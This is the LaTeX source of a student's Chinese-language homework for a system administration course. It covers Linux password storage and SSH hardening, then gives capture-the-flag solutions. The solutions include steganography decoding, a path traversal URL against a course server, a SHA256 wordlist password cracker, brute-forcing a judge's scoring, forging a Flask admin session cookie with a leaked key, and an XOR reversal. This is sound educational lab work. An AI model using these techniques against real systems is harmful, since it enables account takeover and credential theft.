\documentclass[12pt]{article}
\usepackage{graphicx}
\usepackage[margin=2cm, a4paper]{geometry}
\usepackage{setspace}
\usepackage{pdfpages}
\usepackage{float}
\usepackage{ctex}
\usepackage{amsmath}
\usepackage{fancyvrb}
\usepackage{amssymb}
\usepackage{minted}
\usepackage{enumitem}
\usepackage[colorlinks,linkcolor=blue]{hyperref}

\usepackage{xeCJK}
\setCJKmainfont{Noto Serif TC}

\renewcommand{\contentsname}{Contents}
\renewcommand{\figurename}{Figure}
\renewcommand{\tablename}{Table}
\hypersetup{
    colorlinks=true,
    linkcolor=black,
    filecolor=magenta,      
    urlcolor=blue,
}
\newcommand{\mytitle}{網路管理與系統管理 HW12}
\newcommand{\myauthor}{B13902022 賴昱錡}

\usepackage{fancyhdr}
\pagestyle{fancy}
\fancyhead{}
\fancyhead[L]{\mytitle}
\fancyhead[R]{\myauthor}

\title{\mytitle}
\author{\textbf{\myauthor}}
\date{\today}

\begin{document}

\onehalfspacing
\maketitle

\section*{1.Linux 大小事}
\subsection*{(a)}
\href{https://security.stackexchange.com/questions/37050/where-is-my-password-stored-on-linux}{Reference}

密碼目前是存在 \verb|/etc/shadow| (以前是在 \verb|/etc/passwd|,但它所有人都可以讀、也並未完善加密過,並不安全),只能由 root 讀寫,然後這些密碼是 salted 和 hashed 的,常見的加密演算法包括 SHA512、SHA256、MD-5。
\subsection*{(b)}
\href{https://stackoverflow.com/questions/71839786/in-the-case-of-a-normal-user-with-no-access-to-etc-shadow-file-how-can-the-pass}{Reference}

\verb|/usr/bin/passwd| 擁有 SetUID 的檔案權限,因此 \verb|passwd| 被執行時其實會以檔案擁有者的身份去執行 (就是 root),因此能確認你輸入的密碼是否正確,更新密碼並將新的密碼寫入 \verb|/etc/shadow|。
\subsection*{(c)}
\href{https://www.loggly.com/ultimate-guide/linux-logging-basics/#:~:text=%2Fvar%2Flog%2Fauth.,pluggable%20authentication%20modules%20(PAM).}{Reference}

這些 log 會被儲存在 \verb|/var/log/auth.log|,裡頭主要紀錄安全相關的 event (登入(包含 IP)和 root user 的活動,以及 sshd、gdm 相關的認證訊息),還有來自 PAM (pluggable authentication modules) 的輸出。
\subsection*{(d)}
第一種方法是只採用 ssh key 作為登入的機制,這樣攻擊者就完全無法透過暴力猜密碼的方式來登入。第二種方式是在 server 端安裝 \href{https://github.com/fail2ban/fail2ban}{fail2ban} 等工具,可以把 ssh 登入失敗超過一定次數的 IP 封鎖掉,進而有效防範同一來源的密碼爆破攻擊(?)

\section*{2.畫中有話}
\subsection*{(a)}
首先我們可以知道 pixels 是 secret\_mygo.png 的像素資料,每一項都是一個長度為 3 的 tuple,分別代表紅、藍、綠的數值 (介於 0-255),在讀入某個字串後 (data),將每一個字元轉為 unicode,再轉為 8 位的 binary string。在處理 pixels 裡面的資料時,這份扣會把連續三格 pixel (pixels[3*i], pixels[3*i+1], pixels[3*i+2]) 變成一個長度為 9 的 list,之後再根據對應到 data 的第 i 個字元所轉成的字串 (方法如前述),改變 list 中的數值 (一個 binary string 有 8 項,也對應到 list 的前八項),最終再將 list 裡面的數值寫回圖片。
\subsection*{(b)}
為了找到藏在圖片裡面的 string,我們可以用 3 個像素為單位來解析,很容易可以發現到,如果 (a) 所述的 binary string 的一項是 "1",則 colors 對應到的一項數值必為奇數,反之則為偶數,所以我們可以跑過足夠多的像素,然後找到很多 binary string 及其對應的 unicode and 字元,用其來拼湊出 flag。

在這裡我使用 python 來找出 flag,程式碼 (Script 在 \verb|code/solve_secret_mygo.py|) 如下,最終得到的結果是: (btw 在那之前可能要安裝 PIL module)

{\centering\verb|HW12{S4KiCh4n_sakiCHAN_S4k1ChaN}|\par}

參考資料是我自己,好耶,這是少數完全不用仰賴 GPT 解出的題目。
\begin{minted}[frame=lines,framesep=2mm,baselinestretch=1.2,linenos,breaklines]{python}
from PIL import Image

image_file = "secret_mygo.png"
img = Image.open(image_file)
pixels = list(img.getdata())
flag = ""

for i in range(0, 100, 3):
    colors = list(pixels[i])+list(pixels[i+1])+list(pixels[i+2])
    tmp = ""
    for j in range(8):
        if colors[j] % 2 == 0:
            tmp = tmp + "0"
        else:
            tmp = tmp + "1"
    flag = flag+chr(int(tmp, 2))

print(flag)
\end{minted}

\section*{3. Alya Judge}
\subsection*{(a)}
這題的 flag 是:

{\centering\verb|HW12{r3MeM8eR_To_s3t_S7R0Ng_PAS5WOrds}|\par}

觀察 app.py 我們可以看到 submissions 這條 route 的設計有點危險,因為他會直接去找 submissions 資料夾底下的 <username>.json (這裡 <username> 是 submissions 斜線後的字串),所以我們可以利用這條 route 來構造能存取 accounts/accounts.json 的 URL,我構造的網址如下,理論上他會去存取 \texttt{/submissions/../accounts/accounts.json}。

{\centering\verb|http://140.112.91.4:45510/submissions/%2e%2e%2faccounts%2faccounts|\par}

\begin{minted}[frame=lines,framesep=2mm,baselinestretch=1.2,linenos,breaklines]{python}
user_submissions = load_submissions(username)
# ...
def load_data(filename):
    if os.path.exists(filename):
        with open(filename, 'r') as f:
            try:
                return json.load(f)
            except json.JSONDecodeError:
                return {}
    return {}

def load_submissions(username):
    return load_data(SUBMISSIONS_DIR + username + '.json')
\end{minted}

進到剛剛構造的 URL 後,我們可以看到許多人的 username 和一串應該是 SHA256 的 hash (應該..是密碼)。然後我們可以用簡單的 python script (\verb|code/break_pw.py|) 去從既有的 password list 去找有沒有密碼的 hash 和 fysty 的 hash 相同。
\begin{minted}[frame=lines,framesep=2mm,baselinestretch=1.2,linenos,breaklines]{python}
# break_pw.py
import hashlib
target_hash = "40c3d69c8a012e181bd63d215d61a1df44e8fe7c182da6d24f26b0fae5348010"
wordlist_path = "1M.txt"

with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
    for line in f:
        password = line.strip()  # remove newline and spaces
        hashed = hashlib.sha256(password.encode()).hexdigest()
        if hashed == target_hash:
            print(f"The password is: {password}")
            break
\end{minted}

最終我們可以使用得到的密碼 \verb|mortis00| 去成功登入 fysty 的帳戶,就可以找到這小題的旗幟了!

\subsection*{(b)}
這題的 flag 為:

{\centering\verb|HW12{e5x5Vw2qC}|\par}

觀察 special judge 的 code 會發現到它判斷得分的方式是分段的,假設正解是一個 list (solution),那這份 code 會去看你繳交的程式碼的某一段 substring 有沒有 match 到 solution 的某一項,如果有的話就算得到部份分,然後繼續匹配字串是否有 match 到 solution 的下一項; 如果沒有,就繼續看繳交的 code 後續的 substring 有沒有 match 到 solution 的這一項。

可以試試看分別 submit \verb|H|, \verb|HW|, \verb|HW12|,應該會發現他的分數大概會是公差為 6 的遞增數列,所以 subtask 應該是用字元來切,所以我們可以暴力枚舉 flag 未知的 9 個字元,重複送出攜帶 code and language 的 POST request,如果發現到 response 中的分數增加,就 update 當前成功 match 的字串,最終我們一定可以得到這小題的 flag,而將其 submit 至未完成題目會是 fully accepted。 (script 為 \verb|code/test.py|)。

\subsection*{(c)}
這題的 flag 是:

{\centering\verb|HW12{i_l1KE_a15CR3am_MoRE_7H4n_Co0Ki3s}|\par}

可以發現到這個網站登入的機制 (包含 cookie),是由 flask 裡面的 session 管理,而 session 裡面唯一的 property 是 \verb|username|,在登入後在網站的 \verb|DevTools > Application > Cookies| 中可以看到 \verb|session| 這項 cookie。

我們可以試著偽造 session cookie,由於 app.py 裡頭有 session key:

{\centering\verb|app.config['SECRET_KEY'] = 'A_super_SecUrE_$eCR37_keY'|\par}

可以利用 \verb|flask-unsign| 藉由該 key 與 property 來生出指定的 session cookie (如下所示),最後通過 
\href{https://github.com/ETCExtensions/Edit-This-Cookie}{Edit-This-Cookie} 這個瀏覽器套件來編輯 cookie 的值。重新整理後,即可自動登入 admin 的帳戶,並在他的 submissions 中找到 fLaG,好耶!
\begin{Verbatim}[breaklines]
pip install flask-unsign
flask-unsign --sign --secret 'A_super_SecUrE_$eCR37_keY' --cookie '{"username":"admin"}'
\end{Verbatim}

\section*{4. Introduction to gnireenignE esreveR}
這題的 flag 是:

{\centering\verb|HW12{hW0_8UT_WiTH_r3V3Rse_eN91NE3rinG}|\par}

我拿到 flag 的方法是把 chal.exe 丟進 dogbolt.org,然後發現 Hex-Rays 這個 decompiler 竟然幫我分析好原本程式的架構了。基本上,原本的程式包含以下重要變數:
\begin{minted}[frame=lines,framesep=2mm,baselinestretch=1.2,linenos,breaklines]{c}
char key[9] = "nAs42O2S";
char pattern[40] = {'&','\x16','B','\x06','I','\'','e','c','1','y','&','`','m','\x18'
,'[','\a','&','\x1E','\x01','\a','d','|','`',' ','\v','\x1E','\x16','z','\v','~','|',
'\x16',']','3','\x1A','Z','u','2','\0','\0'}; 
int flag_len = 38; 
\end{minted}

看到程式接受輸入的地方 (應該是 main),他會用 key 對 pattern 做 xor encryption,然後 check 程式接受的參數是不是等於加密後的 pattern。
\begin{minted}[frame=lines,framesep=2mm,baselinestretch=1.2,linenos,breaklines]{c}
int __fastcall main(int argc,
  const char ** argv,
    const char ** envp) {
  int i; // [rsp+1Ch] [rbp-4h]

  if (argc == 2) {
    for (i = 0; i < flag_len; ++i)
      pattern[i] ^= key[i % key_len];
    if (!strcmp(argv[1], pattern))
      puts("Congratulations! You found the flag!");
    else
      puts("Haha! wrong >:)!!!!!!");
    return 0;
  } else {
    puts("Usage: ./chal.exe <flag>");
    return 1;
  }
}
\end{minted}

所以我們可以用前面提到的變數實際去 xor 一遍 (script 在 \verb|code/lahc.c| ),就可以得到程式中的 pattern/flag。(將 flag 作為 chal.exe 的參數執行,可以得到代表正確的訊息)
\begin{minted}[frame=lines,framesep=2mm,baselinestretch=1.2,linenos,breaklines]{c}
// lahc.c
for (int i = 0; i < flag_len; ++i ) pattern[i] ^= key[i % key_len];
printf("%s\n", pattern);
\end{minted}



\end{document}
% how to display codes?
% \begin{minted}[frame=lines,framesep=2mm,baselinestretch=1.2,linenos,breaklines]{python}
% \end{minted}

% how to display images?
% \begin{figure}[H]
%     \centering
%     \includegraphics[width=0.5\linewidth]{}
%     \caption{Caption}
% \end{figure}
% test